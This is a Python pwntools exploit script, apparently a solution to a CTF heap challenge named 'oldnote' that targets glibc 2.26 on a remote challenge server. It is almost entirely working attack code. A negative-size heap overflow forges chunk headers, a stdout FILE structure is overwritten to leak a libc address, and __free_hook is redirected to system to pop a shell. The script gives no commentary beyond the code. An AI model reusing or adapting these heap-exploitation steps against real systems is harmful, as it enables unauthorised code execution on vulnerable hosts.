#!/usr/bin/env python

from pwn import *
from time import sleep
period=0.3
#exe = ELF("./oldnote")
#libc = ELF("./libc-2.26.so")
#ld = ELF("./ld-2.26.so")

#context.binary = exe
def get_leak(size,data):
	p.sendline("1")
	sleep(period)
	p.recvuntil("Note size :")
	p.sendline(str(size))
	
	sleep(period)
	p.recvuntil("Note :")
	p.send(data)
	sleep(period)
	data = p.recvuntil("choice :")
	return data

def new(size,data):
	p.sendline("1")
	sleep(period)
	p.recvuntil("Note size :")
	p.sendline(str(size))
	sleep(period)
	p.recvuntil("Note :")
	p.send(data)
	sleep(period)
	p.recvuntil("choice :")

def delete(index):
	p.sendline("2")
	sleep(period)
	p.recvuntil("Note idx :")
	p.sendline(str(index))
	sleep(period)
	p.recvuntil("choice :")


def exit():
	p.sendline("3")
	sleep(period)

def conn():
	if args.LOCAL:
		#[ld.path, exe.path]
		return process(exe.path, env={"LD_PRELOAD": libc.path})
	else:
		return remote("poseidonchalls.westeurope.cloudapp.azure.com", 9000)


def main():
	global p

	while True:
		try:
			p = conn()
			new(10,"AA")
			new(0xFF,"BBBB")
			new(0xFF,"CCCC")
			new(0xFF,"DDDD")
			delete(0)
			new(-1,"K"*0x10 + p64(0) + p64(0x501))
			#p.interactive()

			delete(2)
			delete(3)
			new(0xf0,"1111")
			new(0xf0-0x30,"2222")
			delete(0)
			new(0x20,"333")
			delete(1)
			delete(0)
			delete(2)
			new(224,"a")
			new(224,"a")
			delete(1)
			delete(0)
			new(144,"a")
			new(160,"a")
			delete(1)
			delete(0)
			# good luck pwning :)
			#delete()
			payload = ""
			payload += "\x00"*0x10
			payload += p64(0) + p64(0xf1)
			payload += "\x00" * (0xf0 - 0x10)
			payload += p64(0) + p64(0xf1)
			payload += "\x00" * (0xf0 - 0x10)
			payload += p64(0) + p64(0xa1)
			payload += "\x00"*(0xa0-0x10)
			payload += p64(0) + p64(0xb1)
			payload += "\x00"*(0xb0-0x10)
			payload += p64(0) + p64(0x1d1)
			payload += "\x20\xa7"
			new(-1,payload)
			new(0x100-0x10,"a")
			#pause()
			payload = ""
			payload += p64(0xfbad3c80)
			payload += p64(0)
			payload += p64(0)
			payload += p64(0)
			payload += "\x08"
			data = get_leak(0x100-0x10,payload)
			print data
			leak = data[17:23]

			leak = u64(leak.ljust(8,"\x00"))
			if "3d3d" in hex(leak):
				p.close()
				continue
			print "leak: ",hex(leak)
			base = leak - 0x3d73e0
			print "base: ",hex(base)
			free_hook = base + 0x00000000003dc8a8
			system = base + 0x0000000000047dc0
			print "free_hook: ",hex(free_hook)
			print "system: ",hex(system)
			delete(0)
			payload = ""
			payload += "\x00"*(0x10)
			payload += p64(0) + p64(0xf1)
			payload += p64(free_hook)
			new(-1,payload)

			delete(0)
			delete(3)
			new(0xf0-0x10,"/bin/sh\x00")
			#pause()
			new(0xf0-0x10,p64(system))
			#pause()
			p.sendline("2")
			sleep(period)
			p.sendline("0")
			sleep(period)
			p.interactive()
		except:
			p.close()



if __name__ == "__main__":
	p = conn()
	main()
